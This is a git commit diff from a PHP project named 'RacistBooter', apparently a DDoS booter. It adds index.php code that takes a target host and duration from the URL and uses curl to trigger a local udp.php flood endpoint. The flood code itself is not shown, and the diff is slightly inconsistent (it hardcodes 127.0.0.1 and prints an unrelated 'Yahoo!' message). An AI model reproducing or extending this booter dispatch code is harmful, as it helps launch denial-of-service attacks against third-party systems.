7a5f7f9c2ff15b341cf9bdd12d8db8b0384283eb
Noyameki <dunthenerd@gmail.com>
2011-08-04 00:39:22 +0200

    UDP & Index.php fixed

--- index.php
+++ index.php
@@ -1,5 +1,16 @@
 <?php
 
-echo 'Test';
+include 'EpiCurl.php';
 
+$host = $_GET['host'];
+$time = intval($_GET['time']);
+$mc = EpiCurl::getInstance();
+
+$shell = trim("http://127.0.0.1/RacistBooter/udp.php?act=phptools&host=127.0.0.1&time={$time}");
+echo $shell;
+$ch = curl_init($shell);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+$curl1 = $mc->addCurl($ch);	     
+echo "Response code from Yahoo! is {$curl1->code}\n";  
 ?>
